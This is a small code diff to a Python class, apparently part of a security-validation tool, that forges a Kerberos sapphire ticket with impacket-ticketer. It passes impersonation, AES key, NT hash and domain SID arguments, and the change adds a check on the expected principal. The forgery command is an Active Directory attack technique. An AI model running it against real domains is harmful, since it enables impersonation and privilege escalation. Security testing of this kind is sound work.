@@ -114,7 +114,8 @@ class SapphireTicketExecutor(ValidationExecutor):
         forge_argv = (["impacket-ticketer", "-request", "-impersonate", imp, *req,
                        "-aesKey", aes, "-nthash", nt, "-domain-sid", sid,
                        "-domain", cfg.domain, forged])
-        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir)
+        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir,
+                                               expect_principal=imp)
         steps += fsteps
         errors += ferrors
 
